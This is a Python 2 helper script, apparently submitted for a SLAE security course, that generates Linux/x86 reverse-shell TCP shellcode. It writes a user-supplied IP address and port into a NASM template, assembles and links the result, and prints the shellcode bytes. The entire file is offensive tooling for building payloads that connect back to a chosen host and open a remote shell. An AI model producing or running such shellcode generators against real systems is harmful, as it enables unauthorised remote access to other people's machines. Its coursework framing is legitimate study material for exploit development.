#!/usr/bin/python

# Student ID  : SLAE-1250
# Student Name: Jonathan "Chops" Crosby
# Assignment 2: Reverse Shell TCP (Linux/x86) Python Helper

import tempfile
import shutil
import os
import sys
import stat
import uuid

if len(sys.argv) != 3:
   
    print "[x] usage: ./shellcode-generator.py port ipaddress (ex. 4444 10.0.7.17)"
    sys.exit(0)

tempDir = tempfile.mkdtemp()

print "[*] created temporary directory: " + tempDir

providedPort = str(format(int(sys.argv[1]), '04x'))
finalPort = "0x"
finalPort += str(providedPort[2:])
finalPort += str(providedPort[:2])
finalPort = finalPort.replace("x00", "x")

print "[*] generated final port in hex: " + finalPort

finalPort = "push word " + finalPort

ipAddress = sys.argv[2].split('.')

with open('reverse-shell-template.nasm') as f:
    content = f.readlines()

# you may also want to remove whitespace characters like `\n` at the end of each line
content = [x.strip() for x in content] 

insertAt = content.index(";ip-address-before-here")

offset = 0
for x in ipAddress:
    if x != '0':
        instruction = "mov byte [esp+" + str(offset) + "], 0x" + str(format(int(x), '02x'))
        content.insert(insertAt, instruction)
        insertAt += 1
    offset += 1

insertAt = content.index(";port-before-here")

content.insert(insertAt, finalPort)

uuidFileName = str(uuid.uuid4())
uuidFullName = tempDir + "/" + uuidFileName + ".nasm"

thefile = open(uuidFullName, 'w')
for x in content:
   thefile.write(x)
   thefile.write("\n")

thefile.close()

print "[*] output nasm file to " + uuidFullName

# create friendly nasm files
nasmFile = uuidFullName
nasmFileNoNasm = nasmFile.replace(".nasm", "")

# do all the template stuff
print "[*] injected dynamic assembly into temporary file"

#copying
shutil.copy("compile.sh", tempDir)
shutil.copy("shellcode-dump.sh",tempDir)


# chmod 755 it in temp dir
os.chmod(tempDir + "/compile.sh", 0775)
os.chmod(tempDir + "/shellcode-dump.sh", 0775)

print "[*] prepped " + tempDir + " with +x auxilary files"

print "[*] assembling and linking"

#./compile.sh
os.system("bash " + tempDir + "/compile.sh " + nasmFileNoNasm)

print "[*] shellcode incoming!"
print "---"

#objdump it
os.system("bash " + tempDir + "/shellcode-dump.sh " + tempDir + " "  + uuidFileName)

print "---"

#delete directory tree
shutil.rmtree(tempDir)
print "[*] deleted temporary directory: " + tempDir

print "[*] done"
